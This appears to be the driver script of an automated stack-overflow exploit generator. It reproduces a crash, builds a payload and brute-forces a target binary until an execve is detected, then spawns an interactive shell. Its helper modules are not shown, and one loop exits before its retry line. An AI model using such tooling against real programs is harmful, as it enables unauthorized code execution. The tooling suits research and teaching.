from utils import *
from payload_utils import *
from exploit_utils import *

def main():
        
    if len(sys.argv) < 2:
        logging.error("No target binary provided")
        sys.exit(1)

    args = check_args()
    target_bin = args.target

    context.log_level='warn'
    # context.log_level = 'debug'

    #the user must provide the crash input
    crash_input = generate_testcase(1500)

    reproducer(crash_input, args)

    while root_cause_analysis(crash_input, args) == False:
        logging.error("the payload did not reach the return address of the vulnerable of the stack frame in the target binary")
        sys.exit(1)
        crash_input = crash_explorer()

    payload_builder(crash_input, target_bin) 

    exploit_cmd = build_exploit_command(args)

    attach_strace()

    #performing brute force attack
    i = 0
    while True:
        logging.info(f"Attempt: {i}")
        i += 1
        exploit_proc = run_exploit(exploit_cmd)
        
        try:
            while True:

                if detect_execve():
                    shell(exploit_proc)

                output = exploit_proc.recv(timeout=0.2)   # timeout -> give enough time for target bin to read the payload and for recv to consume the content of the pty output buffer: 0.1 was not enough apparently
                if output:
                    if detect_crash(exploit_proc.pid) or i == 1:
                        truncate_log()
                        break
                else:
                    break

        except EOFError:
            log.warning("No output received, breaking out of loop.")

        exploit_proc.close()


if __name__ == "__main__":
    main()